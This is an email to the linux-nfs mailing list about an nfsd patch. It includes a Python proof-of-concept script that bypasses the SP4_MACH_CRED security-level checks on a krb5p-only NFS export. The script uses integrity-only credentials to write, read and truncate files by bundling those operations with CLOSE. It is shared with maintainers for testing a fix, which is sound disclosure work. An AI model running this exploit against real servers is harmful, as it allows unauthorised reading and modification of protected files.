Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.221.70
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1795543904;
	b=OVGwUsboMM9lWZNnioQemJW2hzEARuqDcajhWi3aHtAeOWBDv+9DJHWis3PnkgLhLkw0
	 HYSDDC1wel0mDV0+zRmI2oFOZWRJHwH2qXTRkbGtx/D0GJRefG9SydVOtm2bucarcb13P
	 hIOk+OMFOT891FKfZW1bl8IAYVEKMqPb8vew7MjFmOCk+uUepfky9l8QafA7UYLRLJDWV
	 8QGCQWLLGKwRUwQghrFLw+UvmePbn82FirPfAZEQVPrKcOGqbwS4emEPU2s85Lkh7hHM6
	 DlZI4zNXVzBq7eZBcc2gQ0bmfWdQUdy0ISgj1MQEcS5DpiXw0GYRrOYqtD3+h9Nd7MA==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1795543904;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Received:Date:In-Reply-To:
	 Mime-Version:References:X-Mailer:Message-ID:Subject:From:To:Cc:
	 Content-Type;
	bh=OlP8ffLld1Jq+g+4gDcnaNa8iMTt84WayVnOzO6Y/A4=;
	b=2F6ZPVCYreL8nuW3Z9kFrkFy+2x7r6Gylc2z0yA1QXdUO5yvscZgydz7U+UbXjCc3Y/W
	 EOniHjoG7OIkNTlDDoRSccTQJGU4x9c1rddhl+a54u9vqsj/u9Q5oeXRO8nmTkX0SH16n
	 EYAdcf9DqPrU7kJssorFLEeCU8F5YHMJJ+3ioLtHj/njdSgG+2jeQNFYbZaUvVsumafTq
	 291pTOA3bNrwNnG4U0yPSOBzF+grCNl2sWhLkCve1T5uD265lEtVKrMzeIQnTaDOgHrVo
	 c1zfFy3tfBih8jPPF5v6GLqA6yyHiOBVn0SeJtAPI1kpmFSPnQEMgxyR4zhiUDQEc+g==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=google.com;
	spf=pass smtp.mailfrom=flex--dmnk.bounces.google.com;
	dkim=pass header.d=google.com header.i=@google.com header.a=rsa-sha256 header.s=20260707 header.b=Tlp7ANhQ;
	arc=none smtp.remote-ip=209.85.221.70
Received: from mail-wr1-f70.google.com (mail-wr1-f70.google.com [209.85.221.70])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 3C0A6606A321
	for <linux-nfs@vger.kernel.org>; Tue, 24 Nov 2026 18:11:44 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 3C0A6606A321
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=google.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=flex--dmnk.bounces.google.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=google.com header.i=@google.com header.a=rsa-sha256 header.s=20260707 header.b=Tlp7ANhQ
Received: by mail-wr1-f70.google.com with SMTP id ffacd0b85a97d-49090fde23aso2973254f8f.2
        for <linux-nfs@vger.kernel.org>; Tue, 24 Nov 2026 10:11:44 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20260707; t=1795543902; x=1796148702; darn=vger.kernel.org;
        h=content-type:cc:to:from:subject:message-id:references:mime-version
         :in-reply-to:date:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=OlP8ffLld1Jq+g+4gDcnaNa8iMTt84WayVnOzO6Y/A4=;
        b=Tlp7ANhQVd/WZ0XXGoGaoRIUdCMjz1oLPIyZazM4D9kawYJlYs4rUW+ATF2wXvvRum
         zeNMiSHcoS9Zo+5VEkJ7fkO2/U+sBvLMnWTcPMPhDzuZDOvRqeYxHt1C4DPLVdxQs2Fp
         kHYyyPTu12UUPMYHiONqnzCkiswNEa/Yem0gOfw2JF99gSSe5dmBsiKRdA2zA7SJ4Z5z
         bhll/xbfTLJFlSrcURnpJumRvWG77hQJE6Sgudu5VAI4f5/Bivw3xmynbBiXXeK1rzk8
         lRFoNPH/0qDsDhSNeDRvYJryv8lc8rfCW7H9VYGnhsv67MVUCXH1KQZK3kQEZY/65QLU
         GyuA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1795543902; x=1796148702;
        h=content-type:cc:to:from:subject:message-id:references:mime-version
         :in-reply-to:date:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=OlP8ffLld1Jq+g+4gDcnaNa8iMTt84WayVnOzO6Y/A4=;
        b=kLEgmxVDITE5RbTWRNuLeaP1iMV2WQHVGBxP6Ar5/kWTsqOJ+F7HV3a8nOY7ZfRwdC
         hNfrBYNDcNgGp2aoWiQFIXXTsMXShapxGKyl8epwH+VQVMENZdHlL3E9ha2hHccc30nr
         jyu49KjADcQwXphBuJNONUAuVNP/Y8+iEew4tV0wcZPbDAsQRN0DB0J85xtvgaHX4ROX
         cpOWn4TpL9nuxnAFDf7NmT7BqyT5YJQyPnA8gK7Ia9ld/OB/InsKK0298MuWIgGHl7Ph
         i66TqxdWsJw2zi04TMIAPTRkrvbRBSU5diGc06K4EfOMS+kfzFhSFSDqocMlamnhPgSP
         A/tQ==
X-Forwarded-Encrypted: i=1; AL+hErEg7LuAopMvyXMk0YoWUGID+6PuWXDkTEhZdyOTXnW+2IB3Dq/yGu6S7RMZ7o7wW2pMkgaufyul5ZI=@vger.kernel.org
X-Gm-Message-State: APuU4Z82yTZ4WbsgxCj/hYbbve4CLKKep8VL/M5otR+q+AZ1mOJ/d8JO
	GzlaqqZ7DTvc+BKnq9+HgaYaqZ6x2onBE3+pkVMz5sr2tlmeM/RgnKy1ZQfoqUpwU7PjiRjHxg=
	=
X-Received: from wrf12-n2.prod.google.com ([2002:a05:6000:43cc:20b0:48e:d59:85ff])
 (user=dmnk job=prod-delivery.src-stubby-dispatcher) by 2002:a05:6000:12d1:b0:490:9af:d49b
 with SMTP id ffacd0b85a97d-4abb4f59826mr22794730f8f.53.1795543902227; Tue, 24
 Nov 2026 10:11:42 -0800 (PST)
Date: Tue, 24 Nov 2026 18:11:41 +0000
In-Reply-To: <a43ccab0-c4eb-4531-b48a-447f2f9dfed6@slotpi15m67>
X-Mailing-List: linux-nfs@vger.kernel.org
List-Id: <linux-nfs.vger.kernel.org>
List-Post: <mailto:linux-nfs@vger.kernel.org>
List-Help: <mailto:linux-nfs+help@vger.kernel.org>
List-Subscribe: <mailto:linux-nfs+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-nfs+unsubscribe@vger.kernel.org>
List-Owner: <mailto:linux-nfs+owner@vger.kernel.org>
Precedence: list
Mime-Version: 1.0
References: <20261119192322.2691590-1-dmnk@google.com> <a43ccab0-c4eb-4531-b48a-447f2f9dfed6@slotpi15m67>
X-Mailer: git-send-email 2.56.1.663.g77904e546d
Message-ID: <20261124181141.142578-1-dmnk@google.com>
Subject: Re: [PATCH] nfsd: restrict nfsd4_spo_must_allow() to bounded cleanup compounds
From: Dominik Maier <dmnk@google.com>
To: Chuck Lever <cel@kernel.org>
Cc: Jeff Layton <jlayton@kernel.org>, NeilBrown <neil@brown.name>, 
	Olga Kornievskaia <okorniev@redhat.com>, Dai Ngo <Dai.Ngo@oracle.com>, Tom Talpey <tom@talpey.com>, 
	linux-nfs@vger.kernel.org, dmnk+artist@google.com
Content-Type: text/plain; charset="UTF-8"

Hi Chuck,

Sounds good, folding that into your series is much cleaner.

Here's a small pynfs + python3-gssapi reproducer you can point at any
writable sec=krb5p-only export with a machine-credential ticket (no root
needed on the client). On current nfsd-testing it triggers WRITE, READ,
and SETATTR before CLOSE, plus a trailing WRITE after CLOSE on a second
open stateid, and checks that plain CLOSE and GETATTR + CLOSE still
succeed.

Happy to test your series once it's ready!

Best
Dominik

--- spo_write_close.py ---
#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-only
"""Unprivileged reproducer for NFSD SP4_MACH_CRED fh_spo_allowed gap.

Uses pynfs (git://git.linux-nfs.org/projects/cdmackay/pynfs.git) and
python3-gssapi over TCP against any writable sec=krb5p-only NFSv4.1
export, using a machine-credential Kerberos ticket (e.g. host/* or nfs/*).

Usage:
  PYTHONPATH=/path/to/pynfs/nfs4.1:/path/to/pynfs:/path/to/pynfs/xdr \
    ./spo_write_close.py server:/krb5p_export
"""

import os
import sys
import time

import nfs4client
import nfs_ops
from rpc.gss_const import rpc_gss_svc_integrity, rpc_gss_svc_privacy
from rpc.security import AuthGss
from xdrdef.nfs4_const import (
    CLAIM_NULL, EXCHGID4_FLAG_USE_NON_PNFS, FATTR4_CHANGE, FATTR4_MODE,
    FATTR4_SIZE, FATTR4_TIME_METADATA, FATTR4_TIME_MODIFY, FILE_SYNC4,
    NFS4_OK, NFS4ERR_GRACE, NFS4ERR_WRONGSEC, OPEN4_CREATE,
    OPEN4_SHARE_ACCESS_BOTH, OPEN4_SHARE_ACCESS_WANT_NO_DELEG,
    OPEN4_SHARE_DENY_NONE, OP_CLOSE, OP_DELEGRETURN, OP_FREE_STATEID,
    OP_LOCKU, OP_OPEN_DOWNGRADE, OP_TEST_STATEID, SP4_MACH_CRED,
    UNCHECKED4, nfsstat4,
)
from xdrdef.nfs4_type import (
    createhow4, open_claim4, open_owner4, openflag4,
    state_protect4_a, state_protect_ops4,
)

op = nfs_ops.NFS4ops()
ACCESS = OPEN4_SHARE_ACCESS_BOTH | OPEN4_SHARE_ACCESS_WANT_NO_DELEG
CLOSE_WCC = (
    (1 << FATTR4_CHANGE) | (1 << FATTR4_SIZE)
    | (1 << FATTR4_TIME_METADATA) | (1 << FATTR4_TIME_MODIFY)
)
ALLOW_OPS = (
    (1 << OP_CLOSE) | (1 << OP_DELEGRETURN) | (1 << OP_LOCKU)
    | (1 << OP_OPEN_DOWNGRADE) | (1 << OP_TEST_STATEID)
    | (1 << OP_FREE_STATEID)
)


def open_seed(sess, cred_p, cid, dir_ops, name, data=b"initial\n"):
    mode_attrs = {FATTR4_MODE: 0o600}
    how = openflag4(OPEN4_CREATE, createhow4(UNCHECKED4, mode_attrs))
    while True:
        owner = open_owner4(cid, os.fsencode(f"o-{time.monotonic_ns()}"))
        res = sess.compound(
            dir_ops + [
                op.open(0, ACCESS, OPEN4_SHARE_DENY_NONE, owner, how,
                        open_claim4(CLAIM_NULL, name)),
                op.getfh(),
            ],
            credinfo=cred_p,
        )
        if res.status == NFS4ERR_GRACE:
            time.sleep(0.5)
            continue
        if res.status != NFS4_OK:
            raise RuntimeError(f"krb5p OPEN failed: {nfsstat4[res.status]}")
        stid, fh = res.resarray[-2].stateid, res.resarray[-1].object
        if data is not None:
            w = sess.compound(
                [op.putfh(fh), op.write(stid, 0, FILE_SYNC4, data)],
                credinfo=cred_p,
            )
            if w.status != NFS4_OK:
                raise RuntimeError(f"seed WRITE: {nfsstat4[w.status]}")
        return fh, stid


def main() -> int:
    if len(sys.argv) != 2 or ":" not in sys.argv[1]:
        print(f"usage: {sys.argv[0]} server:/krb5p_export", file=sys.stderr)
        return 2
    host, raw_path = sys.argv[1].split(":", 1)
    dir_ops = [op.putrootfh()] + [
        op.lookup(os.fsencode(p)) for p in raw_path.strip("/").split("/") if p
    ]

    cli = nfs4client.NFS4Client(host, 2049, 1)
    call = cli.make_call_function(
        cli.c1, 0, cli.default_prog, cli.default_vers
    )
    cred_i = AuthGss().init_cred(call, target=f"nfs@{host}")
    cred_i.service = rpc_gss_svc_integrity
    cred_p = AuthGss().init_cred(call, target=f"nfs@{host}")
    cred_p.service = rpc_gss_svc_privacy

    prot = state_protect4_a(SP4_MACH_CRED, state_protect_ops4(0, ALLOW_OPS))
    cl = cli.new_client(
        os.fsencode(f"spo-{os.getpid()}-{int(time.time())}"),
        cred=cred_i, protect=prot, flags=EXCHGID4_FLAG_USE_NON_PNFS,
    )
    sess = cl.create_session()
    sess.compound([op.reclaim_complete(False)], credinfo=cred_i)
    cid = cl.clientid
    names = [os.fsencode(f"spo-{os.getpid()}-{i}") for i in range(7)]

    try:
        fh0, s0 = open_seed(sess, cred_p, cid, dir_ops, names[0])
        for label, ops in (
            ("[control 1] krb5i PUTFH + WRITE",
             [op.putfh(fh0), op.write(s0, 0, FILE_SYNC4, b"x")]),
            ("[control 2] krb5i PUTFH + WRITE + TEST_STATEID",
             [op.putfh(fh0), op.write(s0, 0, FILE_SYNC4, b"x"),
              op.test_stateid([s0])]),
        ):
            r = sess.compound(ops, credinfo=cred_i)
            print(f"{label:<46} -> {nfsstat4[r.status]}")
            if r.status != NFS4ERR_WRONGSEC:
                return 2

        fh1, s1 = open_seed(sess, cred_p, cid, dir_ops, names[1])
        fh2, s2 = open_seed(sess, cred_p, cid, dir_ops, names[2], b"SECRET\n")
        fh3, s3 = open_seed(sess, cred_p, cid, dir_ops, names[3])
        fh4, s4a = open_seed(sess, cred_p, cid, dir_ops, names[4])
        _, s4b = open_seed(sess, cred_p, cid, dir_ops, names[4], None)

        bypasses = 0
        for label, ops in (
            ("[test 1]    krb5i PUTFH + WRITE + CLOSE",
             [op.putfh(fh1), op.write(s1, 0, FILE_SYNC4, b"PWN\n"),
              op.close(1, s1)]),
            ("[test 2]    krb5i PUTFH + READ + CLOSE",
             [op.putfh(fh2), op.read(s2, 0, 64), op.close(1, s2)]),
            ("[test 3]    krb5i PUTFH + SETATTR + CLOSE",
             [op.putfh(fh3), op.setattr(s3, {FATTR4_SIZE: 0}),
              op.close(1, s3)]),
            ("[test 4]    krb5i PUTFH + CLOSE + WRITE",
             [op.putfh(fh4), op.close(1, s4a),
              op.write(s4b, 0, FILE_SYNC4, b"PWN\n")]),
        ):
            r = sess.compound(ops, credinfo=cred_i)
            tag = "VULNERABLE" if r.status == NFS4_OK else "FIXED"
            print(f"{label:<46} -> {nfsstat4[r.status]:<16} [{tag}]")
            bypasses += int(r.status == NFS4_OK)

        for idx, label, mid in (
            (5, "[control 3] krb5i PUTFH + CLOSE", []),
            (6, "[control 4] krb5i PUTFH + GETATTR + CLOSE",
             [op.getattr(CLOSE_WCC)]),
        ):
            fhc, sc = open_seed(sess, cred_p, cid, dir_ops, names[idx])
            r = sess.compound(
                [op.putfh(fhc)] + mid + [op.close(1, sc)], credinfo=cred_i
            )
            print(f"{label:<46} -> {nfsstat4[r.status]}")
            if r.status != NFS4_OK:
                return 2
        return 1 if bypasses else 0
    finally:
        for nm in names:
            sess.compound(dir_ops + [op.remove(nm)], credinfo=cred_p)


if __name__ == "__main__":
    sys.exit(main())
